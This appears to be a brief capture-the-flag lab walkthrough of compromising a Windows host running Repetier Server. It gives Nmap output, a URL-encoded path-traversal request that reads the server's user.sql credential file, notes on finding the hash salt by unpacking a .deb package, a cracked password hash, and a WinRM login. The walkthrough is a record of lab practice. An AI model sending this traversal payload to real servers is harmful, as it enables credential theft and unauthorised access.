Scan information:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 10:23 CDT
Nmap scan report for 10.129.231.43
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
3344/tcp open  bnt-manager
5985/tcp open  wsman
```
We note a CVE where we can disclose information on Repetier Servers. using a get request.
[Proof of Concept: Repetier Server =<v.1.4.10 - Multiple Vulnerabilities (LFI, CSRF, Disclosure of Credentials, etc.) - CYBIR - Cyber Security, Incident Response, & Digital Forensics](https://cybir.com/2023/cve/poc-repetier-server-140/)
We use this to disclose creds
```
10.129.202.34:3344/views..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cProgramData%5cRepetier-Server%5cdatabase%5cuser.sql%20/base/connectionLost.php
```

This gets us the user list. 
Next we go to the site, and we find a deb file. 
I can't just decrypt it normally, but that is a SQL db.
So we download the source and de-package it.
#deb-unpack
```sh
ar x Repetier-Server-1.4.17-Linux.deb  
```
From this we find "Administrator" is appended to the hash by searching for the string "login"

This gives us more information to crack on. From this we get the password:
3b3f51e91a93447f14249762f07fd384:AdministratorHUgo##123

We use winrm to login, and we won this machine.